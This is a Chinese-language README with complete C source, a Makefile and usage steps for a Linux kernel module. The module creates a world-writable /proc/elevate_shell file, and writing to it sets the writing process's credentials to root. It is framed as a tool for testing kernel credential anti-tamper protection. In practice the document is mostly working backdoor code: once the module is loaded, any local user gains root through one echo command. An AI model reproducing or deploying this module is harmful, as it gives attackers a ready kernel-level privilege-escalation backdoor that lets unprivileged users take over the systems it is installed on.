安装内核头文件：

```Bash

sudo apt update
sudo apt install linux-headers-$(uname -r)


sudo dnf install kernel-devel
```

编译
```bash
make
```
使用
```bash
sudo insmod ko_cred_tamper.ko # 安装模块
echo "test" > /proc/elevate_shell #往 /proc/elevate_shell写任意信息实现提权
sudo rmmod ko_cred_tamper.ko #卸载模块
dmesg -T | grep ko_cred_tamper # 查看内核模块日志
```

工作流程如下：
1. 模块加载 (insmod ko_cred_tamper.ko)  
- 初始化函数 ko_cred_tamper_init 执行
    - 在 /proc 文件系统下创建文件 elevate_shell（权限 0666，所有用户可读写）。
    - 绑定文件写操作回调函数 proc_write。
    - 打印日志：
```bash
ko_cred_tamper: 模块已加载。写入 /proc/elevate_shell 来尝试提权。
```
2. 用户触发提权操作
- 向 /proc/elevate_shell 写入任意数据（如）：
```bash
echo "test" > /proc/elevate_shell
```
- 内核回调 proc_write 函数
    - 记录触发进程的 PID 和名称（如 bash 进程）：
```bash
ko_cred_tamper: /proc/elevate_shell 的写入操作由 PID 1234 (bash) 触发。
```
- 调用核心函数 elevate_privileges() 尝试提权。
3. 权限提升核心逻辑 (elevate_privileges())
- 步骤 1: 准备新凭证

    - 调用 prepare_creds() 复制当前进程的凭证结构体 struct cred。
    - 失败则打印错误：
```bash
ko_cred_tamper: 无法准备新的凭证 (Unable to prepare new credentials).
```
- 步骤 2: 修改凭证为 root 权限
    - 打印原始 UID/GID（如普通用户 1000）：
```bash
ko_cred_tamper: 原始 UID: 1000, GID: 1000
```
- 将所有权限字段设为 0（root）：
```C++
new_creds->uid = KUIDT_INIT(0);   // 真实用户ID
new_creds->euid = KUIDT_INIT(0);  // 有效用户ID（关键权限检查点）
... // 其他 gid/suid/fsuid 等同理
```
步骤 3: 提交篡改后的凭证

- 调用 commit_creds(new_creds) 应用新凭证。
    - 安全机制拦截点：安全模块应该在此拦截非法提权。
- 打印提权结果：
```bash
ko_cred_tamper: 正在尝试提交UID/GID为0的新凭证...
ko_cred_tamper: 新凭证已提交。当前 UID: 0, GID: 0  # 成功提示
```
4. 模块卸载 (rmmod ko_cred_tamper)
- 清理函数 ko_cred_tamper_exit 执行
- 删除 /proc/elevate_shell 文件。
- 打印日志：
```bash
ko_cred_tamper: 模块已卸载。
```



具体代码：
``` C
#ko_cred_tamper/ko_cred_tamper.c
/*
 * =====================================================================================
 *
 * Filename:  ko_cred_tamper.c
 *
 * Description:  一个用于演示和测试内核凭证(cred)防篡改能力的内核模块。
 * 本模块通过创建一个/proc文件作为接口，当用户向此文件写入时，
 * 模块会尝试将当前进程的权限提升至root。
 *
 *
 * =====================================================================================
 */

// --------------------------------------------------------------------------------
// 头文件包含
// --------------------------------------------------------------------------------

#include <linux/module.h>  // 所有内核模块都需要，包含了加载/卸载模块的宏
#include <linux/kernel.h>  // 包含内核常用函数，如 printk
#include <linux/init.h>    // 包含了 __init 和 __exit 宏
#include <linux/proc_fs.h> // 用于 proc 文件系统的函数，如 proc_create
#include <linux/sched.h>   // 包含进程调度相关的定义，主要是 'current' 宏来获取当前进程
#include <linux/cred.h>    // 定义了 'struct cred' 以及操作它的函数，如 prepare_creds/commit_creds
#include <linux/uaccess.h> // 包含了在内核空间和用户空间之间复制数据的函数（本例未使用，但通常需要）
#include <linux/version.h> // 包含 LINUX_VERSION_CODE 和 KERNEL_VERSION 宏，用于版本判断

// --------------------------------------------------------------------------------
// 宏定义和全局变量
// --------------------------------------------------------------------------------

// 定义我们将在/proc文件系统中创建的文件的名称
#define PROC_NAME "elevate_shell"

// --------------------------------------------------------------------------------
// 函数前向声明
// --------------------------------------------------------------------------------

// 在定义之前声明 proc_write 函数，这样在 proc_ops 结构体中就可以引用它了。
static ssize_t proc_write(struct file *file, const char __user *usr_buf, size_t count, loff_t *pos);

// --------------------------------------------------------------------------------
// procfs 操作定义
// --------------------------------------------------------------------------------

/*
 * 在 5.6.0 及以上版本的内核中，proc_create 函数期望使用 'struct proc_ops'。
 * 这个结构体将文件操作（如写入、读取）与我们的处理函数关联起来。
 * 我们只关心写入操作，所以只定义 .proc_write。
 */
static const struct proc_ops proc_fops = {
    .proc_write = proc_write, // 将写入操作指向我们的 proc_write 函数
};

// --------------------------------------------------------------------------------
// 核心功能函数
// --------------------------------------------------------------------------------

/**
 * @brief elevate_privileges - 提升当前进程权限的核心函数
 *
 * 该函数是整个模块的关键。它创建一套新的、具有root权限的凭证，
 * 并尝试将其应用到触发此操作的当前进程上。
 */
static void elevate_privileges(void)
{
    /*
     * 'struct cred' 是内核中用于存储进程安全上下文（如UIDs, GIDs）的结构体。
     * 直接修改 `current->cred` 是危险且在现代内核中通常被禁止的（写保护）。
     * 正确（但从安全角度仍是篡改）的方式是使用辅助函数。
     */

    // 1. 准备一套新的凭证
    // prepare_creds() 会为当前进程创建一份新的、可写的凭证副本。
    // 它会正确处理引用计数等复杂问题。如果失败，则返回NULL。
    struct cred *new_creds = prepare_creds();

    if (new_creds == NULL)
    {
        pr_err("ko_cred_tamper: 无法准备新的凭证 (Unable to prepare new credentials).\n");
        return;
    }

    // 使用 pr_info 打印日志到内核环形缓冲区 (dmesg)，记录原始的用户ID和组ID
    // current_uid() 和 current_gid() 返回 kuid_t 和 kgid_t 类型
    // from_kuid() 和 from_kgid() 将它们转换为可在日志中打印的普通整数
    pr_info("ko_cred_tamper: 原始 UID: %d, GID: %d\n", from_kuid(&init_user_ns, current_uid()), from_kgid(&init_user_ns, current_gid()));

    // 2. 修改新的凭证，将所有权相关ID设置为0 (root)
    // KUIDT_INIT(0) 和 KGIDT_INIT(0) 是用于创建值为0的 kuid_t 和 kgid_t 类型的宏
    new_creds->uid = KUIDT_INIT(0);   // 真实用户ID (Real User ID)
    new_creds->gid = KGIDT_INIT(0);   // 真实组ID (Real Group ID)
    new_creds->euid = KUIDT_INIT(0);  // 有效用户ID (Effective User ID)，权限检查主要看这个
    new_creds->egid = KGIDT_INIT(0);  // 有效组ID (Effective Group ID)
    new_creds->suid = KUIDT_INIT(0);  // 保存的用户ID (Saved User ID)
    new_creds->sgid = KGIDT_INIT(0);  // 保存的组ID (Saved Group ID)
    new_creds->fsuid = KUIDT_INIT(0); // 文件系统用户ID (File System User ID)
    new_creds->fsgid = KGIDT_INIT(0); // 文件系统组ID (File System Group ID)

    pr_info("ko_cred_tamper: 正在尝试提交UID/GID为0的新凭证...\n");

    // 3. 将被篡改的凭证应用到当前进程
    // commit_creds() 是应用新凭证的函数。这是最关键的一步。
    // 内核的安全模块（LSM），如SELinux或AppArmor，会在此处设置钩子(hook)。
    // 如果策略禁止此类操作，commit_creds() 调用会被拦截和拒绝。
    commit_creds(new_creds);

    // 再次打印日志，验证提权后的UID/GID，检查操作是否真的成功。
    pr_info("ko_cred_tamper: 新凭证已提交。当前 UID: %d, GID: %d\n", from_kuid(&init_user_ns, current_uid()), from_kgid(&init_user_ns, current_gid()));
}

/**
 * @brief proc_write - /proc/elevate_shell 的写操作回调函数
 * @param file      文件对象指针
 * @param usr_buf   指向用户空间缓冲区的指针，包含了用户写入的数据
 * @param count     用户写入数据的字节数
 * @param pos       文件中的偏移量指针
 *
 * 当用户空间的进程向 /proc/elevate_shell 文件执行写操作时，内核会调用此函数。
 */
static ssize_t proc_write(struct file *file, const char __user *usr_buf, size_t count, loff_t *pos)
{
    // 打印日志，记录是哪个进程（PID和进程名）触发了此操作。
    // 'current' 是一个指向当前进程 task_struct 的宏。
    pr_info("ko_cred_tamper: /proc/%s 的写入操作由 PID %d (%s) 触发。\n",
            PROC_NAME, current->pid, current->comm);

    // 调用核心函数，对触发此操作的进程尝试提权。
    elevate_privileges();

    // 即使我们没有使用用户写入的内容，也应该返回写入的字节数。
    // 这会让用户空间的程序（如'echo'）认为写入操作成功了。
    return count;
}

// --------------------------------------------------------------------------------
// 模块初始化与退出
// --------------------------------------------------------------------------------

/**
 * @brief ko_cred_tamper_init - 模块加载时执行的初始化函数
 *
 * 使用 __init 宏标记，内核在模块成功加载后，可能会释放这部分代码占用的内存。
 * @return 0 表示成功，非0表示失败。
 */
static int __init ko_cred_tamper_init(void)
{
    // 使用 proc_create 创建 /proc/elevate_shell 文件。
    // - PROC_NAME: 文件名
    // - 0666: 文件权限，意味着任何用户都可以读写（我们主要关心写）。
    // - NULL: 父目录，NULL表示在/proc根目录下。
    // - &proc_fops: 指向我们的文件操作结构体。
    if (proc_create(PROC_NAME, 0666, NULL, &proc_fops) == NULL)
    {
        pr_err("ko_cred_tamper: 创建 /proc/%s 失败。\n", PROC_NAME);
        return -ENOMEM; // 返回内存不足错误
    }

    pr_info("ko_cred_tamper: 模块已加载。写入 /proc/%s 来尝试提权。\n", PROC_NAME);
    return 0; // 返回0表示模块加载成功
}

/**
 * @brief ko_cred_tamper_exit - 模块卸载时执行的清理函数
 *
 * 使用 __exit 宏标记。
 */
static void __exit ko_cred_tamper_exit(void)
{
    // 在模块卸载时，清理创建的proc文件，否则会留下一个无用的入口。
    remove_proc_entry(PROC_NAME, NULL);
    pr_info("ko_cred_tamper: 模块已卸载。\n");
}

// --------------------------------------------------------------------------------
// 模块注册
// --------------------------------------------------------------------------------

// 注册初始化函数
module_init(ko_cred_tamper_init);
// 注册退出函数
module_exit(ko_cred_tamper_exit);

// --------------------------------------------------------------------------------
// 模块元数据
// --------------------------------------------------------------------------------

MODULE_LICENSE("GPL");                                                 
MODULE_AUTHOR("best1a"); 
MODULE_DESCRIPTION("一个用于测试内核'struct cred'防篡改能力的模块。"); 
```

Make file
```makefile
# 当前内核源码的路径
KDIR := /lib/modules/$(shell uname -r)/build

# 内核模块的目标文件名
obj-m := ko_cred_tamper.o

PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```